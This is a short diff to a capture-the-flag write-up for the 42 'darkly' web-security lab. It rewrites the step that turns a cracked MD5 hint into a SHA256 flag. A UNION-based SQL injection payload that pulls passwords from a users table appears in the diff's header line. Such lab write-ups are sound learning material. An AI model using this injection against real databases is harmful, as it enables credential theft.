@@ -61,10 +61,10 @@ ID: 1 AND 1=1 UNION SELECT Commentaire, countersign FROM users
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
 ```
-
-```
-5ff9d0165b4f92b14994e5c685cdce28 -(MD5 decrypt)-> FortyTwo -(all lower case)-> fortytwo -(sh256 encrypt)->
-
+Following the instruction, convert the string to lowercase and compute SHA256 digests.
+```shell
+┌──$ [~/42/2022/darkly]
+└─>  echo -n FortyTwo | tr -s A-Z a-z | openssl dgst -sha256
 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 ```
 
